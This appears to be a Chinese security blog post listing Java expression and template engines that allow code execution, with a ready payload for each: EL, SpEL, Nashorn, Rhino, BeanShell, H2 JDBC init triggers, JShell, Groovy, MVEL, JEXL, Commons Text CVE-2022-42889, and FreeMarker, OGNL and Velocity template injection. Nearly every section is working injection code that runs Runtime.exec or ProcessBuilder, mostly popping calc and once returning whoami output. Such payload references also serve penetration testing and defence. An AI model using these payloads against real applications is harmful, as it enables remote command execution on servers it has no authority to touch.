#  java代码执行(eval)   
原创 珂字辈  珂技知识分享   2025-05-29 10:02  
  
一、	EL   
  
```
String payload1 = "Runtime.getRuntime().exec('calc')";
ELProcessor eLProcessor = new javax.el.ELProcessor();
eLProcessor.eval(payload1);
```  
  
tomcat/springboot常见代码执行。在tomcat中依赖el-api.jar，在springboot中依赖tomcat-embed-el-9.0.55.jar，单独依赖javax.el-api-2.2.1.jar。  
  
在tomcat低版本(7.x)中，不存在javax.el.ELProcessor类，在tomcat高版本(10.x)中，包名有所变化jakarta.el.ELProcessor。  
  
  
二、	SPEL  
  
```
String payload1 = "T (java.lang.Runtime).getRuntime().exec(\"calc\")";
SpelExpressionParser parser = new org.springframework.expression.spel.standard.SpelExpressionParser();
parser.parseExpression(payload1).getValue();
```  
  
springboot常见代码执行，依赖spring-expression-5.3.39.jar，同时也是Thymeleaf模板的实现语言。  
  
  
三、	Nashorn(js)  
  
```
String payload1 = "java.lang.Runtime.getRuntime().exec('calc')";
ScriptEngineManager scriptEngineManager = new javax.script.ScriptEngineManager();
scriptEngineManager.getEngineByName("JavaScript").eval(payload1);
```  
  
jdk自带JavaScript引擎，自jdk16完全移除。高版本jdk可以依赖nashorn-core-15.4.jar恢复使用。  
  
EL表达式代码执行常用Nashorn来扩展更高级的写法。  
```
String payload2 = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""
                + "new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc']).start()"
                + "\")";
```  
  
除此之外，还是h2/Text等最终代码执行点。  
  
  
四、	Rhino (js)  
  
```
String payload1 = "java.lang.Runtime.getRuntime().exec('calc')";
Context ctx = org.mozilla.javascript.Context.enter();
Scriptable scope = ctx.initStandardObjects();
ctx.evaluateString(scope, payload1, "script", 1, null);
```  
  
第三方JavaScript引擎。依赖rhino-1.7.15.jar，旧版为js-1.7R2.jar。  
  
  
五、	bsh  
  
```
String payload1 = "java.lang.Runtime.getRuntime().exec(\"calc\")";
Interpreter interpreter = new bsh.Interpreter();
interpreter.eval(payload1);
```  
  
国产老项目常见脚本语言，依赖bsh-2.0b5.jar。自带一些脚本集成在语言里作为方法，因此可以很短的命令执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5PbHPLa8NlTL8YOhusK4eG69xcOS65b7yLtnIKlEciahzsrRg1gHcvJdVTLQgETM55oJ79Khkyd4A/640?wx_fmt=png&from=appmsg "")  
  
  
六、	H2  
  
```
String driver = "org.h2.Driver";
Class.forName(driver);
String payload1 = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
	          "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
	          "new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc']).start()\\;\n" +
	          "$$\n";
String payload2 = "jdbc:h2:mem:testdb;"
	    	+ "TRACE_LEVEL_SYSTEM_OUT=3;"
	    	+ "INIT=CREATE ALIAS EXEC AS '"
	    	+ "String shellexec(String cmd) throws java.io.IOException "
	    	+ "{Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}"
	    	+ "'\\;CALL EXEC ('calc')";
DriverManager.getConnection(payload1);
```  
  
最好用的jdbc利用。  
  
  
七、	Jshell  
  
```
String payload1 = "new java.lang.ProcessBuilder(\"cmd\", \"/c calc\").start();";
System.out.println(payload1);
jdk.jshell.JShell.create().eval(payload1);
```  
  
最接近PHP中的eval，同时也可以直接用jshell.exe来执行代码。  
  
>=jdk9才存在。  
  
  
八、	groovy  
  
```
String cmd = "calc";
String script = "@groovy.transform.ASTTest(value={\n" +
	      " assert java.lang.Runtime.getRuntime().exec(\""+cmd+"\")\n" +
	      "})\n" +
	      "def x\n";
//GroovyClassLoader groovyClassLoader = new groovy.lang.GroovyClassLoader();
//groovyClassLoader.parseClass(script);
GroovyShell groovyShell = new groovy.lang.GroovyShell();
groovyShell.evaluate(script);
```  
  
常见的第三方脚本语言，依赖groovy-2.4.3.jar。  
  
  
九、	Mvel  
  
```
String payload = "java.lang.Runtime.getRuntime().exec(\"calc\");";
org.mvel2.MVEL.eval(payload);
```  
  
weblogic喜欢用的脚本语言。依赖mvel2-2.4.14.Final.jar。  
  
  
十、	Jexl  
  
```
String exp = "233.class.forName('java.lang.Runtime').getRuntime().exec('calc')";
JexlEngine engine = new org.apache.commons.jexl3.JexlBuilder().create();
JexlExpression expression = engine.createExpression(exp);
expression.evaluate(null);
```  
  
一个表达式语言库，但同样可以用来执行代码。依赖commons-jexl3-3.2.1.jar  
  
  
十一、	Apache Commons Text  
  
```
StringSubstitutor interpolator = org.apache.commons.text.StringSubstitutor.createInterpolator();  
String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";  
interpolator.replace(payload);
```  
  
即CVE-2022-42889，允许调用js。依赖commons-text-1.9.jar  
  
  
十二、	FreeMarker(SSTI)  
  
```
String templateContent = "Hello, ${name}!";
templateContent = "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"calc\").start()}";

StringTemplateLoader loader = new freemarker.cache.StringTemplateLoader();
loader.putTemplate("myTemplate", templateContent);
Configuration conf = new Configuration(Configuration.VERSION_2_3_31);
conf.setTemplateLoader(loader);

HashMap map = new HashMap();
map.put("name", "bob");
Template template = conf.getTemplate("myTemplate");

StringWriter writer = new StringWriter();
template.process(map, writer);
System.out.println(writer.toString());
```  
  
依赖freemarker-2.3.31.jar。  
  
模板注入也是比较好利用的代码执行处，虽然正常模板内容会写在html/ftl文件中，然后引用模板文件，导致内容不可控，但还是有可能碰到短信/邮件模板内容可控。  
  
注意，模板组件很多高版本都存在限制，无法直接的命令执行。  
  
  
十三、	Ognl(SSTI)  
  
```
OgnlContext context = new ognl.OgnlContext();
Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());
```  
  
依赖ognl-3.0.6.jar。  
  
  
十四、	Velocity(SSTI)  
  
```
        VelocityContext context = new org.apache.velocity.VelocityContext();
        context.put("name", "bob");
        context.put("age", 25);

        String s = "你好，$name，欢迎使用 Velocity！";
        s = 	  "#set($x='')"
        		+ "#set($rt=$x.class.forName('java.lang.Runtime'))"
        		+ "#set($chr=$x.class.forName('java.lang.Character'))"
        		+ "#set($str=$x.class.forName('java.lang.String'))"
        		+ "#set($ex=$rt.getRuntime().exec('whoami'))"
        		+ "$ex.waitFor()"
        		+ "#set($out=$ex.getInputStream())"
        		+ "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))"
        		+ "#end";


        RuntimeServices runtimeServices = new RuntimeInstance();
        Template template = new Template();
        template.setRuntimeServices(runtimeServices);
        template.setData(runtimeServices.parse(new StringReader(s), template));
        template.initDocument();

        StringWriter w = new StringWriter();
        template.merge(context, w);
        System.out.println(s);
        System.out.println(w.toString());
```  
  
依赖velocity-engine-core-2.4.jar  
  
  
